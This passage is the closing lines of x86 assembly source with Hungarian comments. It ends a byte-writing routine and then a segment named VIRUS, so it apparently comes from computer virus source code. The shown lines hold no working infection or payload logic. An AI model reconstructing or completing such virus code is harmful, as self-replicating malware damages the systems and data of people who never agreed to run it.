	CMP AX,CX		;  MINDEN BYTEOT KIIRT?
	JNZ UTAN3		;  NEM
	POP ES
	CLC			;  NEM TORTENT HIBA
	RET			;  VISSZATERES
UTANMAS	ENDP

VEG	EQU $

VIRUS	ENDS

	END
	